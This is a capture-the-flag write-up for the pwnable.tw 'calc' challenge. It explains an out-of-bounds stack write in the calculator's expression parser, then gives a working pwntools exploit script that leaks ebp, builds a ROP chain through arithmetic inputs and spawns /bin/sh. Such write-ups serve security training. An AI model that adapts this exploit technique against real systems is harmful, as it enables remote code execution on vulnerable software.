### Calc

#### Quick overview - 
Value stack has this structure - `[<number of values><32 bit int><32 bit int>...]`
When we send 1+2, it will take 1, and go to `value_stack[number of values+1]` and write 1 there and then two, and then `eval` just reads value_stack[number_of_values] and [number_of_values-1] and performs whatever operation is given.

Now if we send `+10` only, it will make the value stack like - `[<num of values=1><10>]`. And when eval is called, it will just 10+1 and store it in the 0th index which is the num. of values variable. 

This way, +10 actually results in printing of value of `value_stack+(4*10)`. And similarly, `+10+1` results in `value_stack+(4*10)` being incremented by 1. 

Now we can read ebp value to leak stack location. Then will perform ROP. The only gadget available is an int 0x80 syscall, so we set appropriate conditions to make execve syscall to /bin/sh.



```py
from pwn import *
context.arch = "i386"
exe = context.binary = ELF('calc')

#io = process(exe.path)
io = remote("chall.pwnable.tw", 10100)

io.recvuntil(b" ===\n")
io.sendline(b"-11")
c = io.recvline().strip()
canary = int(c)
log.success(f"canary: {p32(canary& 0xffffffff,endianness='big').hex()}")

def overwrite(off, target):
    io.sendline(f"+{off}".encode())
    old = int(io.recvline().strip()) & 0xffffffff
    diff = old - target
    
    if diff > 0:
        io.sendline(f"+{off}-{diff}".encode())
    else:
        io.sendline(f"+{off}+{abs(diff)}".encode())
    io.recvline()


def address_from_offset(ebp_val, input_offset):
    aslr = ebp_val - 0xffffcdd8
    return 0xffffc818+(input_offset*4)+aslr
    
r = ROP(exe)

##leak ebp
io.sendline(b"+360") #4 byte before eip
ebp = int(io.recvline().strip()) & 0xffffffff
log.info(f"leaked ebp (saved ebp in calc) => {hex(ebp)}".encode())

#set eax to 11
overwrite(361, r.eax.address)
overwrite(362, 11)

#set ecx to null, ebx to /bin/sh
overwrite(363, r.ecx.address) #this is ['pop ecx', 'pop ebx', 'ret']
overwrite(364, address_from_offset(ebp, 502))
overwrite(364, address_from_offset(ebp, 502))
overwrite(365, address_from_offset(ebp, 500)) #will write /bin/sh at 500 offset
overwrite(365, address_from_offset(ebp, 500))

#set edx to null
overwrite(366, r.edx.address)
overwrite(367, address_from_offset(ebp, 502))
overwrite(367, address_from_offset(ebp, 502))
overwrite(368, 0x08049a21)

# set 500 offset to /bin/sh
overwrite(500, 0x6e69622f)
overwrite(501, 0x0068732f)
overwrite(502, 0x0)

io.sendline("abc") ##just to cause expression error and calc will exit

io.interactive()
```